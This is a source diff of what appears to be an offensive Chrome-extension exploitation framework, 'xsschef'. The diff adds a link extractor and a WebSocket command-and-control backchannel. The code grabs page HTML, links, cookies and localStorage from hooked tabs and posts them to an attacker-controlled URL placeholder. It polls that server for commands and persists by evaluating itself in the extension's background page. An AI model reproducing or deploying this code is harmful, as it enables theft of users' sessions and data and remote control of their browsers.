@@ -5,7 +5,8 @@
 /*
 todo:
  - chrome.cookies interface
- - websockets
+ - link extractor & navigation
+ - remove tab
 */
 function __xsschef() {
 
@@ -15,7 +16,12 @@ function __xsschef() {
         /* receive commands from ext and pass the results back */
         switch (msg.cmd) {
             case 'sendhtml':
-                __p.postMessage({cmd:'recvstuff', p: {'html':document.documentElement.innerHTML}});
+                var links = [];
+                var nodes = document.getElementsByTagName('a');
+                for (var i = 0; i < nodes.length; i++) {
+                    links.push({'href':nodes[i].href, 'title':nodes[i].title, 'html':nodes[i].innerHTML});
+                }  
+                __p.postMessage({cmd:'recvstuff', p: {'html':document.documentElement.innerHTML, 'links':links}});
             break;
             case 'sendinfo':
                 __p.postMessage({cmd:'recvstuff', p: {'cookies':document.cookie, 'localStorage': localStorage}});
@@ -27,36 +33,68 @@ function __xsschef() {
     }
     
     var backchannel_script = function(msg) {
-        /* receive commands from ext and send the results to c&c */
-        switch (msg.cmd) {
-            case 'log':
-                var x = new XMLHttpRequest();
-                x.open('POST', '__URL__?ch=__CHANNEL__', true);
-                x.send(JSON.stringify(msg.p));
-            break;
-        }
-    }
+        var url = '__URL__';
 
-    var c2c_poller_script = function() {
-       /* poll for commands from c&c server and send them to ext */
-        setInterval(function() {
-            //console.log('polling for cmds');
-            var x = new XMLHttpRequest();
-            x.open('GET', '__URL__?ch=__CMD_CHANNEL__', true);
-            x.onreadystatechange = function () {
-              if (x.readyState == 4 && x.status == 200) {
+        if (url.match(/^http/)) { // http backchannel
+
+            /* receive commands from ext and send the results to c&c */
+            __p.onMessage.addListener(function(msg) {
+                switch (msg.cmd) {
+                    case 'log':
+                        var x = new XMLHttpRequest();
+                        x.open('POST', url + '?ch=__CHANNEL__', true);
+                        x.send(JSON.stringify(msg.p));
+                    break;
+                }
+            });
+                
+           /* poll for commands from c&c server and send them to ext */
+            setInterval(function() {
+                //console.log('polling for cmds');
+                var x = new XMLHttpRequest();
+                x.open('GET', url + '?ch=__CMD_CHANNEL__', true);
+                x.onreadystatechange = function () {
+                  if (x.readyState == 4 && x.status == 200) {
+                    try {
+                        var cmds = JSON.parse(x.responseText);
+                        for (var i = 0; i < cmds.length; i++) {
+                            // forward command to extension
+                            __p.postMessage(cmds[i]);
+                        }
+                    } catch(e) {}
+                  }
+                };
+                x.send(null);
+            }, 2000);
+
+        } else if (url.match(/^ws/)) { // WebSocket based backchannel
+            var ws = new WebSocket(url,'chef');
+            
+            /* receive commands from ext and send the results to c&c */
+            __p.onMessage.addListener(function(msg) {
+                switch (msg.cmd) {
+                    case 'log':
+                        ws.send(JSON.stringify({cmd:'post', p: msg.p}));
+                    break;
+                }
+            });
+
+            ws.onmessage = function(e) { // receive commands
                 try {
-                    var cmds = JSON.parse(x.responseText);
+                    var cmds = JSON.parse(e.data);
                     for (var i = 0; i < cmds.length; i++) {
                         // forward command to extension
                         __p.postMessage(cmds[i]);
                     }
                 } catch(e) {}
-              }
+            }
+            ws.onopen = function() {
+                ws.send(JSON.stringify({cmd:'hello-hook',ch: '__CHANNEL__'}));
             };
-            x.send(null); 
-        }, 2000);
+        }
+        
     }
+
     
     // END scripts
     
@@ -177,7 +215,7 @@ function __xsschef() {
 
     var setupBackchannel = function(tabId, oncomplete) {
         chrome.tabs.executeScript(tabId, 
-            {'code': '(function(){var __p=chrome.extension.connect({name:"backchannel"});__p.onMessage.addListener('+backchannel_script.toString()+');('+c2c_poller_script.toString()+')()})();'}
+            {'code': '(function(){var __p=chrome.extension.connect({name:"backchannel"});('+backchannel_script.toString()+')();})();'}
                 ,function() {setTimeout(oncomplete, 500)});
     }
     
@@ -228,13 +266,15 @@ function __xsschef() {
         log('foothold started');
         report_tabs();
         report_ext();
+        /*
         setInterval(function() {
             log('alive');
         }, 20000);
+        */
     }
 };
 
-if (location.protocol == 'chrome-extension') { // evaluate only in extension code
+if (location.protocol == 'chrome-extension:') { // evaluate only in extension code
     if (chrome.extension.getBackgroundPage()) {// try to persist in background page
         // chrome 18 csp fix - maybe add script to document.body? 
         chrome.extension.getBackgroundPage().eval.apply(chrome.extension.getBackgroundPage(), [__xsschef.toString()+ ";__xsschef();"]);
